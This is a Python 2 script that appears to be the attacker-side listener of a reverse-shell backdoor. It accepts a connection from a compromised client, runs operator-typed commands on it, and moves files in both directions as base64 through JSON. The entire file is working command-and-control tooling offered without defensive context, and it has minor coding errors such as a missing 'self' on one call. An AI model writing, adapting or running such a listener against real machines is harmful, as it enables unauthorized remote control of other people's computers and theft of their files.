#!/usr/bin/env python

import socket
import json
import base64
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i","--ip", dest="ip", help="IP address to listen on")
    parser.add_option("-p","--port", dest="port", help="Port to listent on")
    (options, arguments) = parser.parse_args()
    if not  options.ip and not options.port:
        parser.error("[-] Please specify an ip and a port to listen on, use --help for more info.")
    return options


# listener class
class Listener:

    # initializes some variables
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # change option to reuse connection in case it drops
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
   
    # send and receive data using json wrapping
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    # execute a command on the client
    def execute_remotely(self, command):
        self.reliable_send(command)
        # check for the exit command
        if command[0] == "3x17":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    # write a file after downloading it from the client
    def write_file(self, path, content):
        with open(path, "wb") as local_file:
            local_file.write(base64.b64decode(content))
            return "[+] Download successful!"

    # read a file to be uploaded to the host
    def read_file(self, path):
        with open(path, "rb") as local_file:
            return base64.b64encode(local_file.read())

    # main program loop get commmands a process them accordingly with the previous methods
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                if result == "connected":
                    reliable_send("connected")
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1],result)
            except Exception:
                result = "[-] Error during command execution"

            print(result)

# main program
options = get_arguments()
my_listener = Listener(options.ip, options.port)
my_listener.run()

